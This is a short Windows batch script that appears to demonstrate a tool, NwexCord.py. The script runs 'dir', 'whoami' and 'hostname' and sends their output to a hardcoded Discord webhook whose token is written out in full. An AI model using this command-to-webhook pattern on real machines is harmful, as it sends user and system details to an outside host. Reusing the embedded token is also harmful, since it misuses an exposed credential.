@echo off
set WEBHOOK_URL="https://discord.com/api/webhooks/1480284001951289415/CMenimQeN3yvdcv3xEqM-mXW4V4tBy-bKs2TI7UqbbSVvFG0m5aJJGYv_UozCJ0QrSZ7"

echo 1. Sending a simple command (dir)
py NwexCord.py --webhook %WEBHOOK_URL% --command "dir"

echo.
echo 2. Sending a command with description
py NwexCord.py --webhook %WEBHOOK_URL% --command "whoami" --description "User Info"

echo.
echo 3. Sending using wrapper
call discord-cmd.bat "hostname"

pause
